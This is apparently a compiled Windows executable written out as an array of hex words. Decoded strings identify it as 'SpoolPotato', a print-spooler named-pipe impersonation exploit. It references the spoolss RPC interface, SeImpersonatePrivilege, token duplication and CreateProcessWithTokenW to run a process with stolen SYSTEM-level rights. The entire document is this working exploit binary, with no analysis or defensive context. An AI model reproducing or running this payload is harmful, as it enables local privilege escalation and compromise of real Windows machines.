0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0010003b, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0010003c, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0010003d, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0010003e, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0008003f, 0x00000032, 0x00000000, 0x010a0040, 0x00000000, 0x00000000, 0x00004800, 0x00400000, 0x00320008, 0x00000000, 0x00400000, 0x0000010a, 0x00000000, 0x48000000, 0x00000000, 0x00380041, 0x00004030, 0x003c0000, 0x07460008, 0x0000050a, 0x00000001, 0x00080000, 0x00360000, 0x00080048, 0x00480008, 0x00080010, 0x0018000b, 0x00480002, 0x00080020, 0x0028000b, 0x0070003a, 0x00080030, 0x00000000, 0x00000000, 0x00000021, 0x00000000, 0x800042b0, 0x00000001, 0x00000000, 0x00000000, 0x00000060, 0x12345678, 0xabcd1234, 0x230100ef, 0xab896745, 0x00000001, 0x8a885d04, 0x11c91ceb, 0x0008e89f, 0x6048102b, 0x00000002, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x80003350, 0x00000001, 0x00000000, 0x00000000, 0x800036f0, 0x00000001, 0x02000000, 0x00000000, 0x8a885d04, 0x11c91ceb, 0x0008e89f, 0x6048102b, 0x00000002, 0x00000000, 0x00000000, 0x00000000, 0x80004170, 0x00000001, 0x800010e0, 0x00000001, 0x800010f0, 0x00000001, 0x80006638, 0x00000001, 0x00000000, 0x00000000, 0x80004470, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x80003372, 0x00000001, 0x00000001, 0x00060001, 0x00000000, 0x00000000, 0x0801026e, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x02000001, 0x00000000, 0x00000000, 0x00000000, 0x800036f0, 0x00000001, 0x00000000, 0x00000000, 0x00000141, 0x00000002, 0x800037c8, 0x00000001, 0x00000002, 0x00000000, 0x8000336a, 0x00000001, 0x00000000, 0x00000000, 0x00030735, 0x00000018, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x800036e0, 0x00000001, 0x00000005, 0x00000000, 0x00000005, 0x00000000, 0x00000005, 0x00000000, 0x00040090, 0x00000000, 0x00000014, 0x00000000, 0x00000093, 0x00000000, 0x8a885d04, 0x11c91ceb, 0x0008e89f, 0x6048102b, 0x00000002, 0x00000000, 0x00000000, 0x00000000, 0x80003802, 0x00000001, 0x80003720, 0x00000001, 0x80003372, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x71710533, 0x4937beba, 0xdbb51983, 0x36cc9cef, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x800034d0, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000021, 0x00000000, 0x800037a4, 0x00000001, 0x00010731, 0x00000018, 0x00000080, 0x00000000, 0x00000010, 0x00000000, 0x00002021, 0x00000000, 0x80004288, 0x00000001, 0x00000093, 0x00000000, 0x012c0040, 0x00000038, 0x0000003c, 0x00000008, 0x00000000, 0x00080007, 0x00004070, 0x00000000, 0x80003360, 0x00000001, 0x00000008, 0x00000000, 0x80003369, 0x00000001, 0x000000c8, 0x00000008, 0x80003369, 0x00000001, 0x000000c8, 0x00000010, 0x800043a0, 0x00000001, 0x0000000b, 0x00000018, 0x80003369, 0x00000001, 0x000000c8, 0x00000020, 0x80004158, 0x00000001, 0x0000000b, 0x00000028, 0x80003369, 0x00000001, 0x000000f0, 0x00000030, 0x80001000, 0x00000001, 0x800010a0, 0x00000001, 0x00010741, 0x00000018, 0x800037a8, 0x00000001, 0x00000182, 0x00000018, 0x00000000, 0x00000001, 0x00000010, 0x00000000, 0x00002021, 0x00000000, 0x80004288, 0x00000001, 0x00000093, 0x00000000, 0x00000018, 0x00000000, 0x800043b0, 0x00000001, 0x00000041, 0x00000001, 0x80003480, 0x00000001, 0x00000001, 0x00000000, 0x80003368, 0x00000001, 0x01080040, 0x00000010, 0x0000003c, 0x00000044, 0x00000000, 0x00080002, 0x0000e070, 0x00000000, 0x80003364, 0x00000001, 0x00000118, 0x00000000, 0x80003369, 0x00000001, 0x000000f0, 0x00000008, 0x0070005c, 0x00700069, 0x005c0065, 0x00700073, 0x006f006f, 0x0073006c, 0x00000073, 0x00000000, 0x0063006e, 0x00630061, 0x005f006e, 0x0070006e, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00320031, 0x00340033, 0x00360035, 0x00380037, 0x0031002d, 0x00330032, 0x002d0034, 0x00420041, 0x00440043, 0x0045002d, 0x00300046, 0x002d0030, 0x00310030, 0x00330032, 0x00350034, 0x00370036, 0x00390038, 0x00420041, 0x00000000, 0x00000000, 0x005c005c, 0x005c002e, 0x00690070, 0x00650070, 0x0025005c, 0x00730077, 0x0070005c, 0x00700069, 0x005c0065, 0x00700073, 0x006f006f, 0x0073006c, 0x00000073, 0x00000000, 0x003a0044, 0x00410028, 0x004f003b, 0x00430049, 0x003b0049, 0x00410047, 0x003b003b, 0x0057003b, 0x00290044, 0x00000000, 0x005c005c, 0x00770025, 0x00000073, 0x00000000, 0x005c005c, 0x00770025, 0x002f0073, 0x00690070, 0x00650070, 0x0025002f, 0x00730077, 0x00000000, 0x00690057, 0x0053006e, 0x00610074, 0x005c0030, 0x00650044, 0x00610066, 0x006c0075, 0x00000074, 0x00650053, 0x006d0049, 0x00650070, 0x00730072, 0x006e006f, 0x00740061, 0x00500065, 0x00690072, 0x00690076, 0x0065006c, 0x00650067, 0x00000000, 0x006f006e, 0x00650074, 0x00610070, 0x002e0064, 0x00780065, 0x00000065, 0x00000000, 0x00000000, 0x003a0043, 0x0050005c, 0x006f0072, 0x00720067, 0x006d0061, 0x00610044, 0x00610074, 0x0044005c, 0x0075006f, 0x006c0062, 0x00530065, 0x00610074, 0x00530072, 0x006e0079, 0x005c0063, 0x006f0044, 0x00620075, 0x0065006c, 0x00740053, 0x00720061, 0x00790053, 0x0063006e, 0x00000000, 0x00000000, 0x6079c3ec, 0x00000000, 0x00000002, 0x0000006f, 0x00004900, 0x00003700, 0x00000000, 0x6079c3ec, 0x00000000, 0x0000000c, 0x00000014, 0x00004970, 0x00003770, 0x00000000, 0x6079c3ec, 0x00000000, 0x0000000d, 0x00000230, 0x00004984, 0x00003784, 0x00000000, 0x6079c3ec, 0x00000000, 0x0000000e, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000138, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x80006008, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x80003260, 0x00000001, 0x80003270, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000100, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x80003268, 0x00000001, 0x80003278, 0x00000001, 0x80003280, 0x00000001, 0x80006628, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x53445352, 0x543e74ae, 0x4c12da38, 0xdc17bbbb, 0x51260c95, 0x00000001, 0x555c3a43, 0x73726573, 0x726f465c, 0x74736572, 0x636f445c, 0x6e656d75, 0x475c7374, 0x75487469, 0x6f445c62, 0x656c6275, 0x72617453, 0x6f70535c, 0x6f506c6f, 0x6f746174, 0x3436785c, 0x6c65525c, 0x65736165, 0x6f70535c, 0x6f506c6f, 0x6f746174, 0x702e3436, 0x00006264, 0x00000000, 0x00000016, 0x00000016, 0x00000003, 0x00000013, 0x4c544347, 0x00001000, 0x000018e0, 0x7865742e, 0x6e6d2474, 0x00000000, 0x000028e0, 0x00000036, 0x7865742e, 0x6e6d2474, 0x00303024, 0x00002916, 0x00000092, 0x7865742e, 0x00782474, 0x00003000, 0x00000260, 0x6164692e, 0x35246174, 0x00000000, 0x00003260, 0x00000028, 0x6330302e, 0x00006766, 0x00003288, 0x00000008, 0x5452432e, 0x41435824, 0x00000000, 0x00003290, 0x00000008, 0x5452432e, 0x5a435824, 0x00000000, 0x00003298, 0x00000008, 0x5452432e, 0x41495824, 0x00000000, 0x000032a0, 0x00000008, 0x5452432e, 0x5a495824, 0x00000000, 0x000032a8, 0x00000008, 0x5452432e, 0x41505824, 0x00000000, 0x000032b0, 0x00000008, 0x5452432e, 0x5a505824, 0x00000000, 0x000032b8, 0x00000008, 0x5452432e, 0x41545824, 0x00000000, 0x000032c0, 0x00000010, 0x5452432e, 0x5a545824, 0x00000000, 0x000032d0, 0x00001630, 0x6164722e, 0x00006174, 0x00004900, 0x000002b8, 0x6164722e, 0x7a246174, 0x62647a7a, 0x00000067, 0x00004bb8, 0x00000008, 0x6374722e, 0x41414924, 0x00000000, 0x00004bc0, 0x00000008, 0x6374722e, 0x5a5a4924, 0x00000000, 0x00004bc8, 0x00000008, 0x6374722e, 0x41415424, 0x00000000, 0x00004bd0, 0x00000008, 0x6374722e, 0x5a5a5424, 0x00000000, 0x00004bd8, 0x0000033c, 0x6164782e, 0x00006174, 0x00004f14, 0x000000b4, 0x6164692e, 0x32246174, 0x00000000, 0x00004fc8, 0x00000018, 0x6164692e, 0x33246174, 0x00000000, 0x00004fe0, 0x00000260, 0x6164692e, 0x34246174, 0x00000000, 0x00005240, 0x00000650, 0x6164692e, 0x36246174, 0x00000000, 0x00006000, 0x00000040, 0x7461642e, 0x00000061, 0x00006040, 0x00000610, 0x7373622e, 0x00000000, 0x00007000, 0x000002d0, 0x6164702e, 0x00006174, 0x00008000, 0x00000060, 0x7273722e, 0x31302463, 0x00000000, 0x00008060, 0x00000180, 0x7273722e, 0x32302463, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00011319, 0x0000a204, 0x000027d0, 0x00000040, 0x00020521, 0x000a3405, 0x00001000, 0x00001052, 0x00004bd8, 0x00000021, 0x00001000, 0x00001052, 0x00004bd8, 0x00011319, 0x00006204, 0x000027d0, 0x00000028, 0x00060f01, 0xe00b720f, 0x60087009, 0x30065007, 0x00041a19, 0xf005d20c, 0x50026003, 0x000027d0, 0x00000060, 0x00041321, 0x0015e413, 0x00123408, 0x00001180, 0x00001200, 0x00004c2c, 0x00020821, 0x00137408, 0x00001200, 0x00001252, 0x00004c40, 0x00020821, 0x0014c408, 0x00001252, 0x00001266, 0x00004c58, 0x00000021, 0x00001252, 0x00001266, 0x00004c58, 0x00000021, 0x00001200, 0x00001252, 0x00004c40, 0x00000021, 0x00001180, 0x00001200, 0x00004c2c, 0x00051f19, 0x009f340d, 0x009c010d, 0x00007006, 0x0000284c, 0x00000001, 0x000014a9, 0x00001548, 0x00000001, 0x00001548, 0x000004d1, 0x00052619, 0x00e73415, 0x00e40115, 0x00005006, 0x000027d0, 0x00000710, 0x00021919, 0x005d0107, 0x000027d0, 0x000002d0, 0x00020821, 0x005f6408, 0x00001840, 0x00001869, 0x00004cf4, 0x00020821, 0x005e3408, 0x00001869, 0x000018a8, 0x00004d04, 0x00020821, 0x005c7408, 0x000018a8, 0x000019a1, 0x00004d18, 0x00000021, 0x000018a8, 0x000019a1, 0x00004d18, 0x00000021, 0x00001869, 0x000018a8, 0x00004d04, 0x00000021, 0x00001840, 0x00001869, 0x00004cf4, 0x00010401, 0x00004204, 0x00000001, 0x00081511, 0x00097415, 0x00076415, 0x00063415, 0xe0113215, 0x00002780, 0x00000002, 0x00001b7c, 0x00001beb, 0x00002916, 0x00000000, 0x00001c4e, 0x00001c59, 0x00002916, 0x00000000, 0x00020601, 0x50023206, 0x00040a11, 0x0008340a, 0x7006520a, 0x00002780, 0x00000004, 0x00001c93, 0x00001cb2, 0x0000292d, 0x00000000, 0x00001c88, 0x00001cca, 0x00002946, 0x00000000, 0x00001cd3, 0x00001cde, 0x0000292d, 0x00000000, 0x00001cd3, 0x00001cdf, 0x00002946, 0x00000000, 0x00061a09, 0x000f341a, 0xe016721a, 0x60137014, 0x00002780, 0x00000001, 0x00001d15, 0x00001dfb, 0x0000295a, 0x00001dfb, 0x00020601, 0x50025206, 0x00060f01, 0x0007640f, 0x0006340f, 0x700b320f, 0x00010901, 0x00006209, 0x00040801, 0x70047208, 0x30026003, 0x00020601, 0x30023206, 0x00040d01, 0x0009340d, 0x5006320d, 0x00010409, 0x00002204, 0x00002780, 0x00000001, 0x00002307, 0x00002391, 0x00002990, 0x00002391, 0x00010201, 0x00005002, 0x00081401, 0x00086414, 0x00075414, 0x00063414, 0x70103214, 0x00051501, 0x00ba3415, 0x00b80115, 0x00005006, 0x00040a01, 0x0006340a, 0x7006320a, 0x00060f01, 0x0006640f, 0x0005340f, 0x700b120f, 0x00000000, 0x00000001, 0x00000000, 0x00000001, 0x00010201, 0x00003002, 0x000a1901, 0x00097419, 0x00086419, 0x00075419, 0x00063419, 0xe0153219, 0x00005050, 0x00000000, 0x00000000, 0x0000534e, 0x00003070, 0x00004fe0, 0x00000000, 0x00000000, 0x000054aa, 0x00003000, 0x00005140, 0x00000000, 0x00000000, 0x00005548, 0x00003160, 0x00005180, 0x00000000, 0x00000000, 0x00005588, 0x000031a0, 0x00005198, 0x00000000, 0x00000000, 0x000055d6, 0x000031b8, 0x000051b8, 0x00000000, 0x00000000, 0x000056d6, 0x000031d8, 0x00005218, 0x00000000, 0x00000000, 0x000056f6, 0x00003238, 0x00005228, 0x00000000, 0x00000000, 0x00005716, 0x00003248, 0x000051d0, 0x00000000, 0x00000000, 0x00005738, 0x000031f0, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00005492, 0x00000000, 0x00005482, 0x00000000, 0x0000546c, 0x00000000, 0x00005454, 0x00000000, 0x0000543a, 0x00000000, 0x00005426, 0x00000000, 0x00005408, 0x00000000, 0x000053e8, 0x00000000, 0x000053d0, 0x00000000, 0x00005398, 0x00000000, 0x00005384, 0x00000000, 0x00005372, 0x00000000, 0x0000535c, 0x00000000, 0x00000000, 0x00000000, 0x00005328, 0x00000000, 0x00005314, 0x00000000, 0x00005308, 0x00000000, 0x000052f8, 0x00000000, 0x000052ea, 0x00000000, 0x000052dc, 0x00000000, 0x000052c8, 0x00000000, 0x000052b8, 0x00000000, 0x000052b0, 0x00000000, 0x000052a0, 0x00000000, 0x0000528a, 0x00000000, 0x00005274, 0x00000000, 0x00005260, 0x00000000, 0x0000524c, 0x00000000, 0x0000533a, 0x00000000, 0x00005240, 0x00000000, 0x0000587c, 0x00000000, 0x00005866, 0x00000000, 0x0000584c, 0x00000000, 0x00005836, 0x00000000, 0x00005820, 0x00000000, 0x00005806, 0x00000000, 0x000057ea, 0x00000000, 0x000057d6, 0x00000000, 0x000057b8, 0x00000000, 0x0000579c, 0x00000000, 0x00005788, 0x00000000, 0x0000576e, 0x00000000, 0x0000575a, 0x00000000, 0x00000000, 0x00000000, 0x0000553a, 0x00000000, 0x00005518, 0x00000000, 0x000054b8, 0x00000000, 0x000054ca, 0x00000000, 0x000054ea, 0x00000000, 0x00005506, 0x00000000, 0x0000552a, 0x00000000, 0x00000000, 0x00000000, 0x0000556e, 0x00000000, 0x00005554, 0x00000000, 0x00000000, 0x00000000, 0x000055cc, 0x00000000, 0x00005594, 0x00000000, 0x000055ac, 0x00000000, 0x00000000, 0x00000000, 0x000055e8, 0x00000000, 0x000055f0, 0x00000000, 0x00000000, 0x00000000, 0x000056b4, 0x00000000, 0x00005698, 0x00000000, 0x00005676, 0x00000000, 0x0000565c, 0x00000000, 0x0000564a, 0x00000000, 0x0000563c, 0x00000000, 0x00005630, 0x00000000, 0x000056cc, 0x00000000, 0x00000000, 0x00000000, 0x00005612, 0x00000000, 0x00000000, 0x00000000, 0x00005606, 0x00000000, 0x000055fa, 0x00000000, 0x00000000, 0x00000000, 0x65480354, 0x72467061, 0x00006565, 0x6547021f, 0x72754374, 0x746e6572, 0x636f7250, 0x00737365, 0x724300de, 0x65746165, 0x656d614e, 0x70695064, 0x00005765, 0x615705e8, 0x6f467469, 0x6e695372, 0x4f656c67, 0x63656a62, 0x02e90074, 0x53746547, 0x65747379, 0x7269446d, 0x6f746365, 0x00577972, 0x724300c1, 0x65746165, 0x6e657645, 0x00005774, 0x6c53058d, 0x00706565, 0x65470269, 0x73614c74, 0x72724574, 0x0000726f, 0x65470223, 0x72754374, 0x746e6572, 0x65726854, 0x00006461, 0x65440118, 0x6574656c, 0x656c6946, 0x00880057, 0x736f6c43, 0x6e614865, 0x00656c64, 0x724300f4, 0x65746165, 0x65726854, 0x00006461, 0x65480350, 0x6c417061, 0x00636f6c, 0x654701e7, 0x6d6f4374, 0x65747570, 0x6d614e72, 0x00005765, 0x654702bd, 0x6f725074, 0x73736563, 0x70616548, 0x009e0000, 0x6e6e6f43, 0x4e746365, 0x64656d61, 0x65706950, 0x454b0000, 0x4c454e52, 0x642e3233, 0x00006c6c, 0x65470170, 0x6b6f5474, 0x6e496e65, 0x6d726f66, 0x6f697461, 0x021a006e, 0x6e65704f, 0x65726854, 0x6f546461, 0x006e656b, 0x754400f1, 0x63696c70, 0x54657461, 0x6e656b6f, 0x00007845, 0x6f430081, 0x7265766e, 0x72745374, 0x53676e69, 0x72756365, 0x44797469, 0x72637365, 0x6f747069, 0x536f5472, 0x72756365, 0x44797469, 0x72637365, 0x6f747069, 0x00005772, 0x7243008b, 0x65746165, 0x636f7250, 0x41737365, 0x65735573, 0x00005772, 0x6e49018f, 0x61697469, 0x657a696c, 0x75636553, 0x79746972, 0x63736544, 0x74706972, 0x0000726f, 0x6d49018c, 0x73726570, 0x74616e6f, 0x6d614e65, 0x69506465, 0x6c436570, 0x746e6569, 0x02150000, 0x6e65704f, 0x636f7250, 0x54737365, 0x6e656b6f, 0x008d0000, 0x61657243, 0x72506574, 0x7365636f, 0x74695773, 0x6b6f5468, 0x00576e65, 0x6f4c01ad, 0x70756b6f, 0x76697250, 0x67656c69, 0x6d614e65, 0x00005765, 0x655302f4, 0x6b6f5474, 0x6e496e65, 0x6d726f66, 0x6f697461, 0x02c1006e, 0x65766552, 0x6f547472, 0x666c6553, 0x001f0000, 0x756a6441, 0x6f547473, 0x506e656b, 0x69766972, 0x6567656c, 0x44410073, 0x49504156, 0x642e3233, 0x00006c6c, 0x644e00a4, 0x696c4372, 0x43746e65, 0x336c6c61, 0x01760000, 0x42637052, 0x69646e69, 0x7246676e, 0x74536d6f, 0x676e6972, 0x646e6942, 0x57676e69, 0x02100000, 0x53637052, 0x6e697274, 0x6e694267, 0x676e6964, 0x706d6f43, 0x5765736f, 0x02140000, 0x53637052, 0x6e697274, 0x65724667, 0x00005765, 0x70520174, 0x6e694263, 0x676e6964, 0x65657246, 0x02260000, 0x64697555, 0x74536f54, 0x676e6972, 0x021d0057, 0x64697555, 0x61657243, 0x00006574, 0x52435052, 0x642e3454, 0x00006c6c, 0x6544000a, 0x6f727473, 0x766e4579, 0x6e6f7269, 0x746e656d, 0x636f6c42, 0x0003006b, 0x61657243, 0x6e456574, 0x6f726976, 0x6e656d6e, 0x6f6c4274, 0x00006b63, 0x52455355, 0x2e564e45, 0x006c6c64, 0x5f5f0008, 0x70735f43, 0x66696365, 0x685f6369, 0x6c646e61, 0x00007265, 0x5f5f0025, 0x5f647473, 0x65707974, 0x666e695f, 0x65645f6f, 0x6f727473, 0x696c5f79, 0x00007473, 0x656d003e, 0x7465736d, 0x43560000, 0x544e5552, 0x31454d49, 0x642e3034, 0x00006c6c, 0x72660018, 0x00006565, 0x616d0019, 0x636f6c6c, 0x004a0000, 0x7363775f, 0x706d6369, 0x00a10000, 0x63736377, 0x735f7970, 0x000c0000, 0x74735f5f, 0x5f6f6964, 0x6d6d6f63, 0x765f6e6f, 0x70776e73, 0x746e6972, 0x00735f66, 0x695f0036, 0x7474696e, 0x006d7265, 0x695f0037, 0x7474696e, 0x5f6d7265, 0x003f0065, 0x6865735f, 0x6c69665f, 0x5f726574, 0x006c6c64, 0x635f0018, 0x69666e6f, 0x65727567, 0x72616e5f, 0x5f776f72, 0x76677261, 0x00330000, 0x696e695f, 0x6c616974, 0x5f657a69, 0x7272616e, 0x655f776f, 0x7269766e, 0x656d6e6f, 0x0000746e, 0x695f0034, 0x6974696e, 0x7a696c61, 0x6e6f5f65, 0x74697865, 0x6261745f, 0x0000656c, 0x655f0022, 0x75636578, 0x6f5f6574, 0x6978656e, 0x61745f74, 0x00656c62, 0x635f0016, 0x74697865, 0x70610000, 0x736d2d69, 0x6e69772d, 0x7472632d, 0x6165682d, 0x316c2d70, 0x302d312d, 0x6c6c642e, 0x70610000, 0x736d2d69, 0x6e69772d, 0x7472632d, 0x6474732d, 0x6c2d6f69, 0x2d312d31, 0x6c642e30, 0x7061006c, 0x736d2d69, 0x6e69772d, 0x7472632d, 0x7274732d, 0x2d676e69, 0x312d316c, 0x642e302d, 0x00006c6c, 0x2d697061, 0x772d736d, 0x632d6e69, 0x722d7472, 0x69746e75, 0x6c2d656d, 0x2d312d31, 0x6c642e30, 0x04d4006c, 0x436c7452, 0x75747061, 0x6f436572, 0x7865746e, 0x04db0074, 0x4c6c7452, 0x756b6f6f, 0x6e754670, 0x6f697463, 0x746e456e, 0x00007972, 0x745204e2, 0x7269566c, 0x6c617574, 0x69776e55, 0x0000646e, 0x6e5505be, 0x646e6168, 0x4564656c, 0x70656378, 0x6e6f6974, 0x746c6946, 0x00007265, 0x6553057d, 0x686e5574, 0x6c646e61, 0x78456465, 0x74706563, 0x466e6f69, 0x65746c69, 0x059c0072, 0x6d726554, 0x74616e69, 0x6f725065, 0x73736563, 0x038b0000, 0x72507349, 0x7365636f, 0x46726f73, 0x75746165, 0x72506572, 0x6e657365, 0x04510074, 0x72657551, 0x72655079, 0x6d726f66, 0x65636e61, 0x6e756f43, 0x00726574, 0x65470220, 0x72754374, 0x746e6572, 0x636f7250, 0x49737365, 0x02240064, 0x43746547, 0x65727275, 0x6854746e, 0x64616572, 0x00006449, 0x654702f2, 0x73795374, 0x546d6574, 0x41656d69, 0x6c694673, 0x6d695465, 0x036e0065, 0x74696e49, 0x696c6169, 0x4c53657a, 0x48747369, 0x00646165, 0x73490384, 0x75626544, 0x72656767, 0x73657250, 0x00746e65, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0xd2205dcd, 0xffffd466, 0x2ddfa232, 0x00002b99, 0xffffffff, 0x00000000, 0x00000001, 0x00000002, 0x0000202f, 0x00000000, 0x0000f800, 0x00000000, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00001000, 0x00001052, 0x00004bd8, 0x00001052, 0x00001073, 0x00004be8, 0x00001073, 0x0000109e, 0x00004bfc, 0x000010a0, 0x000010d5, 0x00004c0c, 0x00001110, 0x00001172, 0x00004c1c, 0x00001180, 0x00001200, 0x00004c2c, 0x00001200, 0x00001252, 0x00004c40, 0x00001252, 0x00001266, 0x00004c58, 0x00001266, 0x00001370, 0x00004c6c, 0x00001370, 0x00001378, 0x00004c80, 0x00001378, 0x0000139c, 0x00004c90, 0x0000139c, 0x000013bd, 0x00004ca0, 0x000013c0, 0x0000158c, 0x00004cb0, 0x00001590, 0x00001835, 0x00004cdc, 0x00001840, 0x00001869, 0x00004cf4, 0x00001869, 0x000018a8, 0x00004d04, 0x000018a8, 0x000019a1, 0x00004d18, 0x000019a1, 0x00001a76, 0x00004d2c, 0x00001a76, 0x00001a7e, 0x00004d40, 0x00001a7e, 0x00001a86, 0x00004d50, 0x00001a86, 0x00001aa0, 0x00004d60, 0x00001aa0, 0x00001ab8, 0x00004d70, 0x00001ad0, 0x00001af1, 0x00004d78, 0x00001af4, 0x00001b44, 0x00004d70, 0x00001b44, 0x00001c5a, 0x00004d7c, 0x00001c5c, 0x00001ce0, 0x00004dc0, 0x00001ce0, 0x00001e11, 0x00004e14, 0x00001e14, 0x00001e51, 0x00004e44, 0x00001e54, 0x00001e88, 0x00004e68, 0x00001e88, 0x00001f59, 0x00004e54, 0x00001f5c, 0x00001fcd, 0x00004e5c, 0x00001fd0, 0x0000207c, 0x00004e70, 0x000020a0, 0x000020bb, 0x00004d70, 0x000020bc, 0x000020f5, 0x00004d70, 0x000020f8, 0x0000212c, 0x00004d70, 0x0000212c, 0x00002141, 0x00004d70, 0x00002144, 0x0000216c, 0x00004d70, 0x0000216c, 0x00002181, 0x00004d70, 0x00002184, 0x000021e4, 0x00004ea4, 0x000021e4, 0x00002214, 0x00004d70, 0x00002214, 0x00002228, 0x00004d70, 0x00002228, 0x00002271, 0x00004e68, 0x00002274, 0x000022ff, 0x00004e68, 0x00002300, 0x00002398, 0x00004e7c, 0x00002398, 0x000023bc, 0x00004e68, 0x000023bc, 0x000023e5, 0x00004e68, 0x000023f8, 0x00002542, 0x00004eb8, 0x00002544, 0x00002580, 0x00004ec8, 0x00002580, 0x000025bc, 0x00004ec8, 0x000025c0, 0x00002761, 0x00004ed4, 0x000027d0, 0x000027ed, 0x00004d70, 0x000027f0, 0x0000284b, 0x00004ef4, 0x0000284c, 0x000028d1, 0x00004efc, 0x000028f0, 0x000028f2, 0x00004ee8, 0x00002910, 0x00002916, 0x00004ef0, 0x00002916, 0x0000292d, 0x00004db8, 0x0000292d, 0x00002946, 0x00004db8, 0x00002946, 0x0000295a, 0x00004db8, 0x0000295a, 0x00002990, 0x00004e3c, 0x00002990, 0x000029a8, 0x00004e9c, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 